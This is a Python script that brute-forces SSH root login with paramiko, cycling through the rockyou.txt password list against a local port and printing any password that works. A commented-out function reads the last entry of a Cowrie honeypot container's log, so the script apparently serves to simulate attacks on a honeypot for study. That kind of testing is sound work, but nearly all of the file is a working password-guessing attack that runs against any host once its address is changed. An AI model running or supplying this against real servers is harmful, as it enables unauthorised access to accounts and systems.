import paramiko
import time
import subprocess
import json
import socket

# SSH connection details
hostname = "127.0.0.1"
port = 2222
username = "root"

def create_bound_socket(source_ip, dest_ip, dest_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((source_ip, 0))  # Bind to source IP with random port
    sock.connect((dest_ip, dest_port))
    return sock

def attempt_ssh_connection(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        sock = create_bound_socket("127.0.2.2", hostname, port)
        print("Attempting bruteforce with password", password)
        client.connect(
            hostname=hostname,
            port=port,
            username=username,
            password=password,
            timeout=5,
            sock=sock
        )
        # Success
        return True

    except paramiko.AuthenticationException:
        print(f"[-] {username}:{password}")
        return False
    except Exception as e:
        print(f"Connection error: {e}")
        return False
    finally:
        client.close()

def attempt_fetch_honeypot_data():
    container_name = "cowrie_docker"
    try:
        inspect_result = inspect_result = subprocess.run(
        ['docker', 'inspect', container_name],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=True
    )
        container_info = json.loads(inspect_result.stdout)

        volume_path = None
        for mount in container_info[0].get("Mounts", []):
            if mount["Destination"] == "/cowrie/cowrie-git/var":
                volume_path = mount["Source"]
                break
        if volume_path:
            log_file = f"{volume_path}/log/cowrie/cowrie.json"
            print(f"Log file path: {log_file}")
            with open(log_file, "r") as f:
                log_data = f.read()
                last_line = log_data.strip().split("\n")[-1]
                print("Last log entry")
                print(last_line)
    except subprocess.CalledProcessError as e:
        print(f"Error running docker inspect: {e.stderr}")
    except FileNotFoundError as e:
        print(f"Error accessing log file: {e}")



#def main():
#    attempt_fetch_honeypot_data()

def main():
    print("Starting brute-force simulation...")
    try:
        with open("rockyou.txt", 'r') as rockyou:
            for line in rockyou:
                password = line.strip()
                if attempt_ssh_connection(password) == True:
                    print(f"[+] {username}:{password}")
                    break
                #attempt_fetch_honeypot_data()

                #time.sleep(1)
    except KeyboardInterrupt:
        print("Program stopped by user.")

if __name__ == "__main__":
    main()

